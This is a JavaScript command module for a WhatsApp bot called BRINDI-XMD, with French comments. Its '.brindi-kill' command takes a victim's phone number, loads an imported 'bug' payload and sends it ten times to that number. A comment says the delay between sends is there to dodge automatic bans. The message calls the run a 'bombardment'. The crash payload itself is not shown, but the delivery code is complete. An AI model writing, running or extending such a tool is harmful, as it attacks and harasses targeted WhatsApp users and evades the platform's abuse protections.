const bugPayload = require('../lib/brindi-kill.js'); 

async function brindiKillCommand(sock, chatId, senderId, mentionedJids, message, args) {
    const argsArray = Array.isArray(args) ? args : (args ? args.split(' ') : []);

    // 1. Force l'utilisation stricte : un numéro est obligatoire
    if (argsArray.length === 0) {
        return sock.sendMessage(chatId, {
            text: "❌ Utilisation incorrecte.\nSaisie requise : `.brindi-kill +237××...` ou `.brindi-kill 2376xxxxxxxx`\n\n> BRINDI-XMD"
        }, { quoted: message });
    }

    // Nettoyage du numéro
    let cleaned = argsArray.join('').replace(/[^0-9]/g, "");

    // Vérification de la longueur minimale
    if (cleaned.length < 11) {
        return sock.sendMessage(chatId, {
            text: "❌ Numéro invalide.\nSaisie requise : `.brindi-kill +237××...`\n\n> BRINDI-XMD"
        }, { quoted: message });
    }

    const target = cleaned + "@s.whatsapp.net";
    const targetName = cleaned;

    // Correction ici : affichage cohérent de 10 messages au lieu de 100
    await sock.sendMessage(chatId, {
        text: `⏳ *Initialisation de la salve (10 messages) brindi-kill sur* *+${targetName}*...`
    }, { quoted: message });

    try {
        // 2. Construction du message avec le contenu du const importé
        const finalMessage = `${bugPayload}\n\n> BRINDI-XMD`;
        let successCount = 0;

        // 3. Boucle d'envoi pour envoyer le message exactement 10 fois
        for (let i = 1; i <= 10; i++) {
            await sock.sendMessage(target, { text: finalMessage });
            successCount++;

            // Augmentation du délai à 3000ms (3 secondes) pour protéger ton numéro du ban automatique
            await new Promise(r => setTimeout(r, 3000));
        }

        // 4. Message de confirmation final à l'expéditeur après les 10 envois
        await sock.sendMessage(chatId, {
            text: `✅ *Bombardement terminé !*\nTotal : *${successCount}/10* Bug envoyés avec succès à *+${targetName}*.\n\n> BRINDI-XMD`
        }, { quoted: message });

    } catch (err) {
        console.error(`❌ Échec de la commande brindi-kill :`, err.message);
        await sock.sendMessage(chatId, {
            text: `❌ Une erreur est survenue lors de l'envoi de la salve.\n\n> BRINDI-XMD`
        }, { quoted: message });
    }
}

module.exports = brindiKillCommand;
